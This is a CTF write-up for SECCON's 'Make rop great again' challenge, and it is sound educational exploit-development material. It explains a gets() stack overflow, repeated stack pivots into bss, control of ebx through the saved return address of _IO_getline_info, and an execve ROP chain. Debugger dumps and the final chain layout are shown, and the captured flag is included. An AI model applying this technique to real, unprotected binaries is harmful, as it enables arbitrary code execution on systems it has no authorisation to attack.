# Make rop great again

No pie, NX bit set, no canary

### Bug:
Stack buffer overflow in the main function using `gets()`.

### Exploit:
We can't do classic ret2libc here cause no `pop rdi; ret` gadget. But we can control the first argument of gets call by jumping in the middle of main function.

```c
   0x00000000004011be <+17>:	lea    rax,[rbp-0x10]
   0x00000000004011c2 <+21>:	mov    rdi,rax
   0x00000000004011c5 <+24>:	mov    eax,0x0
   0x00000000004011ca <+29>:	call   0x401080        <------ gets
```

Stack pivot to bss (`0x404500`) and call gets in there, which will leave some libc function addresses in bss.
```c
22:0110│-410 0x404410 —▸ 0x6fff552038e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
23:0118│-408 0x404418 —▸ 0x6fff552045c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
24:0120│-400 0x404420 —▸ 0x404460 —▸ 0x404480 —▸ 0x4044e0 —▸ 0x404520 ◂— ...
25:0128│-3f8 0x404428 —▸ 0x6fff55092795 (__GI__IO_file_underflow+357) ◂— test rax, rax
26:0130│-3f0 0x404430 ◂— 0
27:0138│-3e8 0x404438 —▸ 0x6fff552038e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
pwndbg> 
28:0140│-3e0 0x404440 —▸ 0x6fff55202030 (_IO_file_jumps) ◂— 0
29:0148│-3d8 0x404448 ◂— 0x7fffffe0
2a:0150│-3d0 0x404450 —▸ 0x6fff55203964 (_IO_2_1_stdin_+132) ◂— 0x5520572000000000
2b:0158│-3c8 0x404458 —▸ 0x6fff552038e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
2c:0160│-3c0 0x404460 —▸ 0x404480 —▸ 0x4044e0 —▸ 0x404520 —▸ 0x404820 ◂— ...
2d:0168│-3b8 0x404468 —▸ 0x6fff550955c2 (_IO_default_uflow+50) ◂— cmp eax, -1
2e:0170│-3b0 0x404470 —▸ 0x404830 ◂— 0
2f:0178│-3a8 0x404478 —▸ 0x6fff552038e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
pwndbg> 
30:0180│-3a0 0x404480 —▸ 0x4044e0 —▸ 0x404520 —▸ 0x404820 —▸ 0x4047c0 ◂— ...
31:0188│-398 0x404488 —▸ 0x6fff55086f6a (_IO_getline_info+170) ◂— cmp eax, -1
32:0190│-390 0x404490 ◂— 0
33:0198│-388 0x404498 ◂— 0x552038e0
34:01a0│-380 0x4044a0 —▸ 0x404811 ◂— 0x6262626262626262 ('bbbbbbbb')
35:01a8│-378 0x4044a8 ◂— 0xa /* '\n' */
36:01b0│-370 0x4044b0 —▸ 0x6fff552f0740 ◂— 0x6fff552f0740
37:01b8│-368 0x4044b8 —▸ 0x404810 ◂— 0x6262626262626262 ('bbbbbbbb')
pwndbg> 
38:01c0│-360 0x4044c0 —▸ 0x6fff552038e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
39:01c8│-358 0x4044c8 —▸ 0x404020 (stdin@GLIBC_2.2.5) —▸ 0x6fff552038e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
3a:01d0│-350 0x4044d0 ◂— 0
3b:01d8│-348 0x4044d8 —▸ 0x6fff5532d000 (_rtld_global) —▸ 0x6fff5532e2e0 ◂— 0
3c:01e0│-340 0x4044e0 —▸ 0x404520 —▸ 0x404820 —▸ 0x4047c0 ◂— 0
3d:01e8│-338 0x4044e8 —▸ 0x6fff550871de (gets+366) ◂— mov rcx, qword ptr [r13]
3e:01f0│-330 0x4044f0 ◂— 0
3f:01f8│-328 0x4044f8 ◂— 0
pwndbg> 
40:0200│-320 0x404500 —▸ 0x7ffed16a86b8 —▸ 0x7ffed16a92a3 ◂— './chall_patched'
41:0208│-318 0x404508 ◂— 1
42:0210│-310 0x404510 ◂— 0
43:0218│-308 0x404518 —▸ 0x403dc8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401140 (__do_global_dtors_aux) ◂— endbr64 
44:0220│-300 0x404520 —▸ 0x404820 —▸ 0x4047c0 ◂— 0
45:0228│-2f8 0x404528 —▸ 0x4011cf (main+34) ◂— mov eax, 0
```

Stack pivot again (`0x404800`) to preserve the libc address. Now we can use the add_addr32 gadget to build execve rop chain in bss.
```c
0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
```

But we don't have control of the `ebx` register here? And there are no gadgets which lets us control `ebx`.
or is it?

There was a similar challenge in [Project sekai ctf 2022](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/pwn/gets/) where the author found a way to control `ebx` by overwriting saved `rip` of `_IO_getline_info` function which is called inside the `gets()` call.

```c
 ► 0x7eb0cc486f9e <_IO_getline_info+222>        pop    rbx     RBX => 0x22897     <----- Control ebx/rbx
   0x7eb0cc486f9f <_IO_getline_info+223>        pop    r12     R12 => 0
   0x7eb0cc486fa1 <_IO_getline_info+225>        pop    r13     R13 => 0
   0x7eb0cc486fa3 <_IO_getline_info+227>        pop    r14     R14 => 0
   0x7eb0cc486fa5 <_IO_getline_info+229>        pop    r15     R15 => 0
   0x7eb0cc486fa7 <_IO_getline_info+231>        pop    rbp     RBP => 0x404465
   0x7eb0cc486fa8 <_IO_getline_info+232>        ret                                <main+40>
```

How can we control overwrite saved `rip` of `_IO_getline_info`?
Set the first argument of `gets()` call to `rsp-0x70` (or something closer, 0x70 worked for me).

Now we collected all the pieces to exploit the program. Build a rop chain in bss using leftover food and stack pivot AGAIN to trigger the rop.

Final rop chain in bss:
```c
25:0128│-320 0x404428 —▸ 0x7eb0cc4b502c (strndup+76)               ◂— pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
26:0130│-318 0x404430 ◂— 0
27:0138│-310 0x404438 —▸ 0x7eb0cc6038e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
pwndbg> 
28:0140│-308 0x404440 —▸ 0x7eb0cc602030 (_IO_file_jumps) ◂— 0
29:0148│-300 0x404448 ◂— 0x7fffffe0
2a:0150│-2f8 0x404450 —▸ 0x7eb0cc603964 (_IO_2_1_stdin_+132) ◂— 0xcc60572000000000
2b:0158│-2f0 0x404458 —▸ 0x7eb0cc510a4d (eval_expr_multdiv+157)    ◂— pop rsi
2c:0160│-2e8 0x404460 ◂— 0
2d:0168│-2e0 0x404468 —▸ 0x7eb0cc50f75b (__spawnix+875)            ◂— pop rdi
2e:0170│-2d8 0x404470 —▸ 0x404830 ◂— 0
2f:0178│-2d0 0x404478 —▸ 0x7eb0cc4eef34 (execve+4)                 ◂— mov eax, 0x3b; syscall
```

Flag: `SECCON{53771n6_rd1_w17h_6375_m4k35_r0p_6r347_4641n}`

Exploit: [hack.py](./hack.py)